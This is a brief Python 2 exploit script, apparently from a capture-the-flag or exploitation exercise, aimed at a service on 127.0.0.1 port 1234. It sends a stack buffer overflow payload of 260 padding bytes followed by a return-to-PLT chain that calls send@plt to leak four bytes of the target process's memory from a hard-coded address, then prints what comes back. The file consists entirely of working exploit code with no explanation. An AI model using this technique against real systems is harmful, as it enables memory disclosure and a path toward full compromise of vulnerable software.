#!/usr/bin/env python
from socket import *
from struct import pack

p = lambda x : pack("<L", x)

s = socket(AF_INET, SOCK_STREAM)
s.connect(("127.0.0.1", 1234))

s.recv(32)

payload = "A"*260
payload += p(0x80484d0) # send@plt
payload += "AAAA"
payload += p(4)
payload += p(0x8048194) #&GNU
payload += p(4)
payload += p(0) # flag for send()

s.send(payload)
print "[*] Received: %s"%s.recv(4)
s.close()